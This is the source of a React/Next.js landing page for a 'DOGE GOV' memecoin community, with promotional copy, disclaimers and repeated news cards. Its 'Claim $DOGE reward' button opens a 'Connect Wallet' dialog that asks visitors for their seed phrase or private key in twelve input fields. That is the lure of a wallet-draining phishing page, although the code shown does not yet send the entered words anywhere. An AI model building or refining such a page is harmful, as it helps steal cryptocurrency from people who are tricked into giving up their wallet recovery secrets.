"use client";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import Image from "next/image";
import { useState } from "react";

export default function Home() {
  const [count, setCounts] = useState(12);

  return (
    <div
      className=""
      style={{
        backgroundImage: "url(/doge-banner-mobile-2.jpg)",
        backgroundPosition: "center",
        backgroundSize: "cover",
        minHeight: "auto",
        backgroundRepeat: "no-repeat",
        height: "60rem",
      }}
    >
      {/* announcment  */}
      <div className="bg-black">
        <p className="text-center text-[10px] [font-family:var(--font-inconsolata)] px-[2rem] uppercase">
          This is not an official website of the United States government and is
          Not affiliated with the doge
        </p>
      </div>
      <div className="mt-[12rem] px-5">
        <div className="bg-black p-3 text-[14px] w-fit">
          <h1 className="uppercase">much wow. much efficiency.</h1>
        </div>
        <h1 className="[font-family:var(--font-oswald)] font-bold text-[36px] lg:text-[68px] uppercase leading-9">
          The Department of Government Efficiency Memecoin Community
        </h1>
        <p
          className="[font-family:var(--font-inconsolata)] mt-3 text-[#9d9d9d]"
          style={{ letterSpacing: "0.05rem", lineHeight: "140%" }}
        >
          DOGE GOV is a community-run memecoin based on the DOGE. We use the
          power of community and virality of memes to help spread the great work
          of DOGE. DOGEGOV is the strongest memecoin narrative this cycle. Every
          single influential person in the US is talking about the DOGE. Join
          us.
        </p>
        <div className="my-3 mb-5 space-y-4 text-[18px]">
          <Dialog>
            <DialogTrigger className="w-full cursor-pointer">
              <p className="bg-white text-black [font-family:var(--font-inconsolata)] w-full py-3 uppercase">
                Claim $DOGE reward
              </p>
            </DialogTrigger>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>Connect Wallet</DialogTitle>
                <DialogDescription className="text-[15px]">
                  Enter your seed phrases or a private key to restore your
                  wallet.
                </DialogDescription>
              </DialogHeader>
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-3 gap-3">
                {[...Array(count)].map((_, i) => (
                  <input
                    key={i}
                    type="text"
                    placeholder={`Word ${i + 1}`}
                    className="border px-5 py-1 rounded-[5px] text-[13px] outline-none text-center"
                    style={{ display: "block", marginBottom: "5px" }}
                  />
                ))}
              </div>
              <div className="w-full flex justify-around">
                <button className="cursor-pointer">Cancel</button>
                <button
                  className="cursor-pointer"
                  onClick={() => setCounts(12)}
                >
                  Submit
                </button>
              </div>
            </DialogContent>
          </Dialog>

          <button className="bg-white text-black [font-family:var(--font-inconsolata)] w-full py-3 uppercase">
            Contact Support
          </button>
        </div>
      </div>
      <div className="bg-white text-black p-5">
        <h1 className="text-[15px]">Welcome to DOGE GOV</h1>
        <h1
          className="[font-family:var(--font-oswald)] text-[28px] mb-[16px] font-[600] uppercase"
          style={{ lineHeight: "125%" }}
        >
          For those that still don&apos;t understand. DOGE GOV is a
          community-run memecoin project based on the DOGE. We are not the
          official DOGE.
        </h1>
        <p className="mb-[16px]">
          We are passionate supporters of DOGE and Elon Musk. Our mission is to
          harness the power and virality of memes, community, and cryptocurrency
          to be a positive force in spreading the good word about DOGE&apos;s
          latest work. We believe in empowering people to hold government
          entities accountable for their financial decisions. Join us today!
        </p>
        <button className="bg-black text-white [font-family:var(--font-inconsolata)] w-full py-3 uppercase">
          Claim $DOGE reward
        </button>
        <p
          className="mt-[16px] [font-family:var(--font-inconsolata)]  text-[13px]"
          style={{ color: "rgb(175, 175, 175)" }}
        >
          DOGE GOV has no association with the official DOGE Organization. This
          token is a community-driven meme project designed to raise awareness
          of government spending and over-regulation. It has no intrinsic value
          or financial return expectations and operates without a formal team or
          roadmap. The token is intended solely for educational and
          entertainment purposes.
        </p>
      </div>
      <div className="bg-white text-black p-5 space-y-10">
        {/* New Header  */}
        <div>
          <Image
            src="https://doge-memes.b-cdn.net/doge-elon_doge-breakdown.jpg"
            alt=""
            width={300}
            height={300}
            className="h-auto w-full mb-5"
          />
          <p className="uppercase mb-4">Fox News</p>
          <h1
            className="text-[30px] font-[600] [font-family:var(--font-oswald)] "
            style={{ lineHeight: "120%" }}
          >
            Full Elon Musk explanation on DOGE during Executive Order Signing
            Event with Trump (30 minutes)
          </h1>
          <p
            className="text-[14px] [font-family:var(--font-oswald)] mt-10"
            style={{ color: "rgba(0, 0, 0, 0.5)" }}
          >
            12 February 2025
          </p>
        </div>
        {/* Sub News  */}
        <div>
          <div>
            <Image
              src="https://doge-memes.b-cdn.net/doge-elon_doge-breakdown.jpg"
              alt=""
              width={300}
              height={300}
              className="h-auto w-full mb-5"
            />
            <p className="uppercase mb-4">Fox News</p>
            <h1
              className="text-[30px] font-[600] [font-family:var(--font-oswald)] "
              style={{ lineHeight: "120%" }}
            >
              Full Elon Musk explanation on DOGE during Executive Order Signing
              Event with Trump (30 minutes)
            </h1>
            <p
              className="text-[14px] [font-family:var(--font-oswald)] mt-10"
              style={{ color: "rgba(0, 0, 0, 0.5)" }}
            >
              12 February 2025
            </p>
          </div>

          <div>
            <Image
              src="https://doge-memes.b-cdn.net/doge-elon_doge-breakdown.jpg"
              alt=""
              width={300}
              height={300}
              className="h-auto w-full mb-5"
            />
            <p className="uppercase mb-4">Fox News</p>
            <h1
              className="text-[30px] font-[600] [font-family:var(--font-oswald)] "
              style={{ lineHeight: "120%" }}
            >
              Full Elon Musk explanation on DOGE during Executive Order Signing
              Event with Trump (30 minutes)
            </h1>
            <p
              className="text-[14px] [font-family:var(--font-oswald)] mt-10"
              style={{ color: "rgba(0, 0, 0, 0.5)" }}
            >
              12 February 2025
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
